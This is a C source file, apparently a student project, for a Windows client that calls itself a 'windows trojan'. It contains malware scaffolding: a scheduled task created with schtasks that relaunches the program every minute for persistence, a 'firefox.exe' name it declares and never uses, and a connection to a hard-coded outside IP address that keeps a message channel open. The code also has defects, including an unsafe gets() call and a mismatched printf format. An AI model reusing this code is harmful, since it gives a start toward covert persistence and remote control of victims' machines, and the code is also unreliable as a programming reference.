#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <unistd.h>
#include <string.h>

const char nomFichierCourant[]= "firefox.exe";

void envoyerDonnee(int sock) {

	char buffer[2024];
	int envoie;

	//scanf("Veuillez entrer votre message : %s", &buffer);
	printf("Veuillez entrer votre message : ");
	gets(buffer);
	envoie = send(sock, buffer, sizeof(buffer), 0);
	printf("\n");


}

void lancerTache() {


    char chemin[100];
    GetModuleFileName(0, chemin, 99);
    printf("\n%s\n\n", chemin);

    char requete [] = "schtasks /Query | find \"firefox\" > tmp.txt";
    system(requete);
    FILE *f = fopen("tmp.txt", "r");
    char result[10];
    fgets(result, sizeof(result), f);
    printf("\n%s\n\n", strlen(result));
    fclose(f);
    char tache[] = "schtasks /Create /TN \"test_Rayane\" /SC MINUTE /TR \"\'C:\\Users\\Mireille-Rayane\\Desktop\\projetTrojanWin_client\\bin\\Debug\\projetTrojanWin_client.exe\'\"";

    system(tache);
}

int main() {

    lancerTache();

    WSADATA info;
    if (WSAStartup(MAKEWORD(1,1), &info) != 0)
      MessageBox(NULL, "Impossible d'initialiser WinSock!", "WSAStartup", MB_OK);

    printf("\n\nBienvenue sur windows trojan\n\n");


	int connection, config, envoie ;
    SOCKET soc;
    soc = socket(AF_INET,SOCK_STREAM, 0 );

    SOCKADDR_IN configuration;


    //configuration.sin_port = htons(2345);
    configuration.sin_family = AF_INET;
    //configuration.sin_addr.s_addr = inet_addr("77.197.195.72");
    configuration.sin_port = htons(2345);
    configuration.sin_addr.s_addr = inet_addr("77.197.195.72");


    connection = connect(soc, (SOCKADDR *) &configuration, sizeof(configuration));

    if(connection != -1) printf("\n\nVous etes connecté\n\n");
    else {
        printf("\n\nerreur de connextion\n\n");
        exit(0);
    }


    //DANS LA CONNECTION
    char buffer[2024] ;


    while(1) {
    //	scanf("Entrez un message : %c", &buffer);
    //	envoie = send(soc, buffer, sizeof(buffer), 0);
        envoyerDonnee(soc);
        recv(soc, buffer, sizeof(buffer), 0);
        //codage par défault : 850      codage pour blocnote(ascii) : 1252
        FILE *f = fopen("reception.txt", "w");
        fprintf(f, " %s", buffer);
        fclose(f);
        //system("chcp 1252");
        printf("\n\nRéponse : %s\n\n", buffer);


    }

    //a changer
    if(envoie != -1) printf("\n\nEnvoie réussi\n\n");
    else exit(0);


    printf("\n\nFermeture de la connection\n\n");

    WSACleanup();

    return 0;

}
